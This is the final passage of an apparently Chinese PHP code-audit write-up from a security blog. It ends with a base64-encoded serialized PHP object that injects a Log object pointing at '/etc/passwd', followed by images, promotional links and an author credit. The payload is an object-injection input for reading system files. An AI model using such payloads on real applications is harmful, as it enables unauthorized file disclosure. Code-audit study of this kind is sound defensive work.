class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;&gt;&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">print</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">s</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6ODoidHlwZV9sb2ciO3M6MTE6Ii9ldGMvcGFzc3dkIjt9fQ=='</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;&gt;&gt;</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4485981308411215" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/47_ruBgxPyaKe3iaTIqAicyJKI5X5oqOw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIzT13Gf7xc82o57ic1Qa6UC9mEaRruBgxPyaKe3iaTIqAicyJKI5X5oqOw/640?wx_fmt=png'" data-type="png" data-w="963" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__0" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><img data-ratio="0.109375" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/48_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-w="640" style="box-sizing: border-box !important;visibility: visible !important;width: 640px !important;"></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__1" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)">推荐阅读：</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="font-size:15px;line-height:35px;;color: rgb(255, 104, 39);">本月报名可以参加抽奖送Kali NetHunter手机的优惠活动</span><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247497897&amp;idx=1&amp;sn=5801b91d451b4c253eb3e2c5ff220673&amp;chksm=ec1cad96db6b2480ce0be49a377819558c06b29603b812512b7cb52ca0c123bc444764f11502&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;"><span class="js_jump_icon h5_image_link" data-positionback="static" style="line-height: 0;inset: auto;"><img class="rich_pages" data-galleryid="" data-ratio="0.4269788182831661" data-s="300,640" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/49_ZtzN9KGsEWibPgYw55Lkm5VuKthibQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="897" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 36px;inset: auto;box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"></span></a></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__5" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__6" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)" style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)">点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__7" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__8" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font-size:12px;line-height:32px;;">原创投稿作者：11ccaab</span><span style="color: rgba(0, 0, 0, 0.3);letter-spacing: 0.544px;text-align: start;font-size:12px;line-height:32px;;"></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__8" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font-size:12px;line-height:32px;;">未经授权，禁止转载</span></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><img class="rich_pages __bg_gif" data-galleryid="" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/50_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style="box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"></p>
                </div>
</div>
</body>
</html>